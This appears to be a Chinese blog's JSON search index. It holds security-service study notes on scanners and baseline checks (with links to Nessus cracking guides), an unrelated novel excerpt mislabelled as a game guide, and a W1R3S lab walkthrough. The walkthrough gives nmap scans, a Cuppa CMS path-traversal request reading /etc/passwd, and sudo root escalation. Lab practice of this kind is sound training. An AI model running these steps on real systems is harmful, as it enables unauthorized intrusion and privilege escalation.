sageMath"]},{"title":"安服仔的基本素养","url":"/2023/03/15/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%85%A5%E9%97%A8/","content":"<h2 id=\"职能常规课\"><a href=\"#职能常规课\" class=\"headerlink\" title=\"职能常规课\"></a>职能常规课</h2><h2 id=\"员工手册\"><a href=\"#员工手册\" class=\"headerlink\" title=\"员工手册\"></a>员工手册</h2><h2 id=\"安全服务认知\"><a href=\"#安全服务认知\" class=\"headerlink\" title=\"安全服务认知\"></a>安全服务认知</h2><p>keyword：安服项、彩虹计划、解决方案项、安全服务 交付文档规范</p>\n<p>tips：不要借安全漏洞做坏事，安服要了解的东西很多</p>\n<h3 id=\"技术类的交互\"><a href=\"#技术类的交互\" class=\"headerlink\" title=\"技术类的交互\"></a>技术类的交互</h3><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315173110594.png\" alt=\"image-20230315173110594\" style=\"zoom:50%;\" />\n\n<p>给客户做培训类似的</p>\n<h3 id=\"安全测试子类：\"><a href=\"#安全测试子类：\" class=\"headerlink\" title=\"安全测试子类：\"></a>安全测试子类：</h3><p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315173251617.png\" alt=\"image-20230315173251617\"></p>\n<h3 id=\"咨询服务类：\"><a href=\"#咨询服务类：\" class=\"headerlink\" title=\"咨询服务类：\"></a>咨询服务类：</h3><p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315173432143.png\" alt=\"image-20230315173432143\"></p>\n<p>滴滴被查，数据安全，数据怎么存更安全等。</p>\n<p>sdl定义：<a href=\"https://zhuanlan.zhihu.com/p/252325178\">分享|安全开发流程（SDL） - 知乎 (zhihu.com)</a></p>\n<h3 id=\"培训服务类：\"><a href=\"#培训服务类：\" class=\"headerlink\" title=\"培训服务类：\"></a>培训服务类：</h3><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315173722143.png\" alt=\"image-20230315173722143\" style=\"zoom:50%;\" />\n\n<p>等级保护对应了解：<a href=\"https://zhuanlan.zhihu.com/p/349827782\">网络安全等级保护分几级？ - 知乎 (zhihu.com)</a></p>\n<h3 id=\"安保服务类\"><a href=\"#安保服务类\" class=\"headerlink\" title=\"安保服务类\"></a>安保服务类</h3><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315174222803.png\" alt=\"image-20230315174222803\" style=\"zoom:50%;\" />\n\n<h3 id=\"达到目的：\"><a href=\"#达到目的：\" class=\"headerlink\" title=\"达到目的：\"></a>达到目的：</h3><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315174424514.png\" alt=\"image-20230315174424514\" style=\"zoom:50%;\" />\n\n<h3 id=\"安全服务要素：\"><a href=\"#安全服务要素：\" class=\"headerlink\" title=\"安全服务要素：\"></a>安全服务要素：</h3><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315174511541.png\" alt=\"image-20230315174511541\" style=\"zoom:50%;\" />\n\n<h3 id=\"人员分类：\"><a href=\"#人员分类：\" class=\"headerlink\" title=\"人员分类：\"></a>人员分类：</h3><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315174608766.png\" alt=\"image-20230315174608766\" style=\"zoom:50%;\" />\n\n<p><del>还有很多没记录</del></p>\n<h3 id=\"树立网络安全\"><a href=\"#树立网络安全\" class=\"headerlink\" title=\"树立网络安全\"></a>树立网络安全</h3><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315175142932.png\" alt=\"image-20230315175142932\" style=\"zoom:50%;\" />\n\n<h2 id=\"漏洞扫描实施\"><a href=\"#漏洞扫描实施\" class=\"headerlink\" title=\"漏洞扫描实施\"></a>漏洞扫描实施</h2><h3 id=\"AWVS使用\"><a href=\"#AWVS使用\" class=\"headerlink\" title=\"AWVS使用\"></a>AWVS使用</h3><p>安装参考链接：<a href=\"https://blog.csdn.net/anlr2020/article/details/118484169\">AWVS14.1.2下载安装教程（2021.3.6版本）_awvs下载与安装_an1r的博客-CSDN博客</a></p>\n<h4 id=\"基本设置\"><a href=\"#基本设置\" class=\"headerlink\" title=\"基本设置\"></a>基本设置</h4><p>在右上角进行设置，可以设置language为简体，看起来更加舒服</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316161733365.png\" alt=\"image-20230316161733365\"></p>\n<p>左边显示的是菜单，因为刚刚开始用不是很熟练，就简单学下前面几个怎么使用：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316161943793.png\"></p>\n<h4 id=\"仪表盘\"><a href=\"#仪表盘\" class=\"headerlink\" title=\"仪表盘\"></a>仪表盘</h4><p>可以显示当前进行的扫描的进度，以及发现的漏洞的数量等</p>\n<p>界面形如：<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316162415536.png\" alt=\"image-20230316162415536\"></p>\n<p>要看具体的漏洞，可以点击左边的扫描具体的看。</p>\n<h4 id=\"目标\"><a href=\"#目标\" class=\"headerlink\" title=\"目标\"></a>目标</h4><p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316162701525.png\" alt=\"image-20230316162701525\"></p>\n<p>分为单个目标，多个目标，目标组</p>\n<p>单个目标扫描一个目标，多个目标可以扫描多个目标。</p>\n<h4 id=\"漏洞\"><a href=\"#漏洞\" class=\"headerlink\" title=\"漏洞\"></a>漏洞</h4><p>显示对应的漏洞，具体看图</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316162926643.png\" alt=\"image-20230316162926643\"></p>\n<h4 id=\"扫描\"><a href=\"#扫描\" class=\"headerlink\" title=\"扫描\"></a>扫描</h4><p>个人感觉最重要的一个tab</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316163005526.png\" alt=\"image-20230316163005526\"></p>\n<p>可以看目标的状态，也可以新建扫描，可以看到扫的漏洞个数。</p>\n<p>点击对应的url可以进入下面的界面</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316163210196.png\" alt=\"image-20230316163210196\"></p>\n<p>上面圈的可以更加详细的看到对应漏洞及说明，以及扫描出来的网页结构等。</p>\n<h4 id=\"报告\"><a href=\"#报告\" class=\"headerlink\" title=\"报告\"></a>报告</h4><p>可以在扫描出生成报告，也可以在此次生成报告，报告种类很多种，暂时还不清楚不同报告类型的差别。</p>\n<h3 id=\"nessus\"><a href=\"#nessus\" class=\"headerlink\" title=\"nessus\"></a>nessus</h3><h4 id=\"安装参考链接\"><a href=\"#安装参考链接\" class=\"headerlink\" title=\"安装参考链接\"></a>安装参考链接</h4><p><a href=\"https://www.52pojie.cn/thread-1650667-1-1.html\">最详细破解nessus(windows)教程 插件更新至20220613 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>\n<p><a href=\"https://www.cnblogs.com/Cl0ud/p/13364718.html\">Nessus破解没有Scan选项的解决办法 - 春告鳥 - 博客园 (cnblogs.com)</a></p>\n<p>上面两个按照顺序弄即可弄好。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230317085903303.png\" alt=\"image-20230317085903303\"></p>\n<p>然后就可以开始使用了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://blog.csdn.net/smli_ng/article/details/105976795</span><br><span class=\"line\">https://zhuanlan.zhihu.com/p/464866605</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"基线核查\"><a href=\"#基线核查\" class=\"headerlink\" title=\"基线核查\"></a>基线核查</h2><h3 id=\"基线核查流程\"><a href=\"#基线核查流程\" class=\"headerlink\" title=\"基线核查流程\"></a>基线核查流程</h3><p>前期：信息收集。<br>中期：实施阶段。现场检查。<br>后期：报告编写。</p>\n<p><del>感觉主要是根据报告模板一个一个检查</del></p>\n<h3 id=\"基线核查方式\"><a href=\"#基线核查方式\" class=\"headerlink\" title=\"基线核查方式\"></a>基线核查方式</h3><p>检查方式：</p>\n<h4 id=\"基线检查平台（公司内部平台）：\"><a href=\"#基线检查平台（公司内部平台）：\" class=\"headerlink\" title=\"基线检查平台（公司内部平台）：\"></a>基线检查平台（公司内部平台）：</h4><p>登录对应平台下载工具进行使用。</p>\n<ul>\n<li>下载脚本</li>\n<li>看readme，然后执行命令</li>\n<li>之前会生成result，新建项目导入之前的result。</li>\n<li>可以生成对应报告，然后对报告进行修改。</li>\n</ul>\n<h4 id=\"人工检查：\"><a href=\"#人工检查：\" class=\"headerlink\" title=\"人工检查：\"></a>人工检查：</h4><p>根据手册的checklist进行检查</p>\n<p>tips：检查数据库类似的东西小心点</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">主机评估-winodws、linux、AIX、HP-UNIX等</span><br><span class=\"line\">网络设备评估-Cisco、H3C、中兴等</span><br><span class=\"line\">其它设备评估-FTP</span><br><span class=\"line\">数据库评估-Oracle-unix、mysql等</span><br><span class=\"line\">中间件评估-Tomcat、Apache、IIS、Nginx</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"远程评估系统：\"><a href=\"#远程评估系统：\" class=\"headerlink\" title=\"远程评估系统：\"></a>远程评估系统：</h4><p>略</p>\n<h3 id=\"常见问题及处置\"><a href=\"#常见问题及处置\" class=\"headerlink\" title=\"常见问题及处置\"></a>常见问题及处置</h3><p>资产数量大，往往涉及几百台主机。<br>非常规安装，找不到部署目录。<br>输入查询命令，返回为空。<br>软件更新较快，检查版本与客户版本不符合。<br>软件版本差异，部分检查项新版本已无相关配置。发现问题，提出建议后，但软件已无相关配置项。</p>\n<h2 id=\"web安全测试实施\"><a href=\"#web安全测试实施\" class=\"headerlink\" title=\"web安全测试实施\"></a>web安全测试实施</h2><p>主要贴图时要清楚</p>\n<p>略</p>\n<h2 id=\"互联网敏感信息泄露\"><a href=\"#互联网敏感信息泄露\" class=\"headerlink\" title=\"互联网敏感信息泄露\"></a>互联网敏感信息泄露</h2><h3 id=\"信息资产梳理\"><a href=\"#信息资产梳理\" class=\"headerlink\" title=\"信息资产梳理\"></a>信息资产梳理</h3><h4 id=\"web网站\"><a href=\"#web网站\" class=\"headerlink\" title=\"web网站\"></a>web网站</h4><p>子域名收集：挖掘机等</p>\n<h4 id=\"互联网接口（API）\"><a href=\"#互联网接口（API）\" class=\"headerlink\" title=\"互联网接口（API）\"></a>互联网接口（API）</h4><p>官方站点搜索<br> 搜索引擎<br> github</p>\n<h4 id=\"APP应用\"><a href=\"#APP应用\" class=\"headerlink\" title=\"APP应用\"></a>APP应用</h4><p>官网<br> 安卓&#x2F;IOS应用商店搜索<br> 搜索引擎</p>\n<h4 id=\"微信小程序\"><a href=\"#微信小程序\" class=\"headerlink\" title=\"微信小程序\"></a>微信小程序</h4><p>微信搜索：<a href=\"https://weixin.sogou.com/\">搜狗微信搜索_订阅号及文章内容独家收录，一搜即达 (sogou.com)</a><br> 官网<br> 小程序收录平台</p>\n<h4 id=\"微信公众号\"><a href=\"#微信公众号\" class=\"headerlink\" title=\"微信公众号\"></a>微信公众号</h4><p>微信搜索<br> 搜狗搜索<br> 官网</p>\n<h3 id=\"信息泄露情况排查\"><a href=\"#信息泄露情况排查\" class=\"headerlink\" title=\"信息泄露情况排查\"></a>信息泄露情况排查</h3><h4 id=\"敏感信息排查\"><a href=\"#敏感信息排查\" class=\"headerlink\" title=\"敏感信息排查\"></a>敏感信息排查</h4><p>网络拓扑、账户&#x2F;密码、邮箱：网盘、github</p>\n<h4 id=\"互联网敏感内容排查\"><a href=\"#互联网敏感内容排查\" class=\"headerlink\" title=\"互联网敏感内容排查\"></a>互联网敏感内容排查</h4><p>百度文库、招聘网站、招投标网站</p>\n<h4 id=\"源代码泄露排查\"><a href=\"#源代码泄露排查\" class=\"headerlink\" title=\"源代码泄露排查\"></a>源代码泄露排查</h4><p>svn、github、csdn</p>\n<h2 id=\"渗透测试实施\"><a href=\"#渗透测试实施\" class=\"headerlink\" title=\"渗透测试实施\"></a>渗透测试实施</h2><p>略</p>\n","tags":["安全服务"]},{"title":"杀戮尖塔观者流派介绍","url":"/2023/02/15/%E6%9D%80%E6%88%AE%E5%B0%96%E5%A1%94%E8%A7%82%E8%80%85/","content":"<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/20230215113853.png\"><br>眼前的场景是那样的普通，以至于巴顿没觉得有任何问题。</p>\n<p>虽然他隐约觉得有一点熟悉，但并不认为这值得奇怪：</p>\n<p>每天都会看到的场景怎么会没有一点熟悉感？</p>\n<p>他目光移动，望向了高空，只见绯红的月亮静静悬挂，挥洒着光芒，让人心情不由自主就沉淀了下来。</p>\n<p>这一刻，巴顿似乎卸下了无形的重担，身心都异常轻松，再也没有了之前的那种恐慌，焦虑和烦躁。</p>\n<p>他的灵性直觉告诉他，弗纳尔这件事情到此结束了，不会再影响到他的生活。</p>\n<p>“风暴在上，感谢主的庇佑。”巴顿旋即握右拳击左胸，小声自语了一句。</p>\n<p>没有了那种担忧和紧绷，他只觉疲惫如同洪水，奔腾着从自己灵魂深处涌了出来，淹没了大脑，淹没了四肢，淹没了身体的每一个细胞。</p>\n<p>巴顿忍不住用手背抵住嘴巴，打了个哈欠，但脸上却多了几分惬意的笑容。</p>\n<p>他没再停留于书房，转身离开这里，一路回到卧室，以享受般的状态泡了个澡，喝了一小杯红酒。</p>\n<p>这一晚，巴顿没再做梦，睡得异常踏实。</p>\n<p>当他早晨醒来时，精神舒展，愉悦暗涌，就仿佛获得了新的一次人生。</p>\n<p>看了眼旁边还在熟睡的妻子，巴顿小心起床，换好衣物，于家附近走了一圈。</p>\n<p>他之前从未发现自己所在的街区是如此的美好：</p>\n<p>空气清新，环境安宁，风景怡人，就连行人都是那样的有教养。</p>\n<p>这让巴顿的心情愈发得好，再次深刻地认识到弗纳尔的事情结束了，自己又回到普通宁和的生活中了。</p>\n<p>他保持着这样的心情，回到家中，和妻儿一起享用起早餐。</p>\n<p>这个过程中，他甚至给妻子讲了讲报纸上登载的笑话，满足了孩子们一个小小的要求。</p>\n<p>看到妻儿脸上的笑容，巴顿由衷地感到满足。</p>\n<p>然后，他穿上外套，戴好帽子，提着手杖，出门乘坐无轨公共马车，一路来到位于城区边缘的“鲁恩古物搜集和保护基金会”。</p>\n<p>进入自己的办公室，巴顿找回了往日的节奏，先不忙着工作，而是给自家准备起加了些奇特草药的红茶。</p>\n<p>就着红茶，悠闲地读完了家里没订阅的那几份报纸，他才拿起收到的信和文件，依次审阅。</p>\n<p>这样的流程，这样的节奏，让他感觉异常舒坦。</p>\n<p>唯一的一点不谐在于，巴顿还是有点担心又收到弗纳尔的信。</p>\n<p>不过，这种担忧没有变成现实。</p>\n<p>大概一刻钟后，他的办公室房门被人笃笃笃敲响。</p>\n<p>“请进。”巴顿端起杯子，喝了口红茶。</p>\n<p>推门而入的是“合规部”副主管，外貌普通，没有特色，但让人感觉亲切的帕切科.道恩。</p>\n<p>“昨晚睡得还好吗？”帕切科立于门口，打招呼般问道。</p>\n<p>“非常棒。”巴顿未做隐瞒。</p>\n<p>帕切科点了下头，微笑说道：</p>\n<p>“看来你确实已经摆脱了这件事情的影响。”</p>\n<p>巴顿没说自己做的那个“噩梦”，转而问道：</p>\n<p>“你呢？”</p>\n<p>“我也睡得很好。”帕切科笑着回应道，“警方已完全接手了这件事情，据说昨晚就找到弗纳尔了，可惜，他似乎遭遇了不幸。”</p>\n<p>“可怜的人，愿他能得到安宁。”巴顿没有说愿主庇佑他，因为弗纳尔已经背弃了对“风暴之主”的信仰，如果真有“庇佑”，那必然是闪电加风暴。</p>\n<p>说完，想到帕切科之前提供的帮助，以及对方令人亲切的姿态，巴顿主动说道：</p>\n<p>“等会一起享用午餐？”</p>\n<p>“你请客吗？”帕切科笑着说道。</p>\n<p>“当然，很高兴认识你这么一位朋友。”</p>\n","tags":["-test1 -test2"]},{"title":"靶机玩耍","url":"/2023/03/16/%E9%9D%B6%E6%9C%BA%E7%8E%A9%E8%80%8D/","content":"<h2 id=\"W1R3S\"><a href=\"#W1R3S\" class=\"headerlink\" title=\"W1R3S\"></a>W1R3S</h2><p>获得靶机IP（记得kali、靶机网络都改桥接）得到ip 192.168.1.28</p>\n<h3 id=\"nmap-扫服务\"><a href=\"#nmap-扫服务\" class=\"headerlink\" title=\"nmap 扫服务\"></a>nmap 扫服务</h3><p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316092242512.png\" alt=\"image-20230316092242512\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo nmap --min-rate 10000  -p-  192.168.1.28      （全面的扫描端口）</span><br><span class=\"line\">sudo nmap -sT -sV -O -p21,22,80,3306 192.168.1.28 （扫描对应端口获取详细信息）（TCP扫描）</span><br><span class=\"line\">    PORT     STATE SERVICE VERSION</span><br><span class=\"line\">    21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class=\"line\">    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class=\"line\">    3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class=\"line\">    10123/tcp open  unknown</span><br><span class=\"line\">    MAC Address: 00:0C:29:A0:15:2E (VMware)</span><br><span class=\"line\">    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class=\"line\">    Device type: general purpose</span><br><span class=\"line\">    Running: Linux 3.X|4.X|5.X</span><br><span class=\"line\">    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1</span><br><span class=\"line\">    OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9, Linux 5.1</span><br><span class=\"line\">    Network Distance: 1 hop</span><br><span class=\"line\">    Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class=\"line\">    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">    Nmap done: 1 IP address (1 host up) scanned in 13.06 seconds</span><br><span class=\"line\">sudo nmap -sU -p21,22,80,3306 192.168.1.28 （udp扫描）//记住还可以扫IPV6</span><br><span class=\"line\">sudo nmap --script=vuln -p21,22,80,3306 192.168.1.28  //（扫描插件漏洞） </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"访问ftp\"><a href=\"#访问ftp\" class=\"headerlink\" title=\"访问ftp\"></a>访问ftp</h3><p>匿名 （获得对应文件）（命令行访问记得输入binary命令，防止破坏可执行文件）</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316092603021.png\" alt=\"image-20230316092603021\"></p>\n<h3 id=\"访问web\"><a href=\"#访问web\" class=\"headerlink\" title=\"访问web\"></a>访问web</h3><h4 id=\"目录爆破：dirb、gobuster、feroxbuster\"><a href=\"#目录爆破：dirb、gobuster、feroxbuster\" class=\"headerlink\" title=\"目录爆破：dirb、gobuster、feroxbuster\"></a>目录爆破：dirb、gobuster、feroxbuster</h4><p>使用dirb爆破找到<a href=\"http://192.168.1.28/administrator/installation/\">http://192.168.1.28/administrator/installation/</a></p>\n<p>数据库创建失败</p>\n<p>开始看cms（cuppa）有漏洞没有</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">searchsploit cuppa</span><br><span class=\"line\">searchsploit  cuppa cms -m 25791  </span><br><span class=\"line\">cat 25971.txt</span><br></pre></td></tr></table></figure>\n\n<p>访问<a href=\"http://192.168.1.28/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd%E5%A4%B1%E8%B4%A5\">http://192.168.1.28/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd失败</a></p>\n<p><a href=\"http://192.168.1.28/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd\">http://192.168.1.28/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a> 失败</p>\n<p><a href=\"http://192.168.1.28/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd\">http://192.168.1.28/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a> 成功显示（但没有东西）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl    --data-urlencode urlConfig=../../../../../../../../../etc/passwd  http://192.168.1.28/administrator/alerts/alertConfigField.php  （需要post）</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"权限维持\"><a href=\"#权限维持\" class=\"headerlink\" title=\"权限维持\"></a>权限维持</h3><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">whoami</span><br><span class=\"line\">uname -a</span><br></pre></td></tr></table></figure>\n\n<p>sudo 提权</p>\n<p>可以ftp提权，也可以sudo &#x2F;bin&#x2F;bash，也可也sudo time &#x2F;root&#x2F;flag.txt</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316093047508.png\" alt=\"image-20230316093047508\"></p>\n<p>成功</p>\n","tags":["vulhub靶机 渗透"]}]